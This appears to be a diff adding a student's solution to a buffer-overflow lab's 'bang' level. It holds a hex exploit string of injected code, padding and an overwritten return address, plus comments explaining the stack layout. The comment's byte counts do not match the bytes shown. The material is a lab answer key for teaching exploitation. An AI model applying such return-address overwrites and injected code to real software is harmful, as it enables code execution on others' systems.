@@ -1,0 +1,3 @@
+bb ec 08 c6 58 b9 dc a1 04 08 89 19 68 a2 89 04 08 c3 ff ff ff ff ff ff fc 7c ff ff
+#first 36 are bytes from the exploit code as seen in the level2ass.s file followed by buffering to fill the rest of the 12 byte char array. Then the return address of bang(in little endian) followed by bytes to fill before writing our cookie to the location where the variable would be stored if passed in normally.
+#this is passed through the sendstring thing to convert it to the proper ascii code for the porgram to then convert.
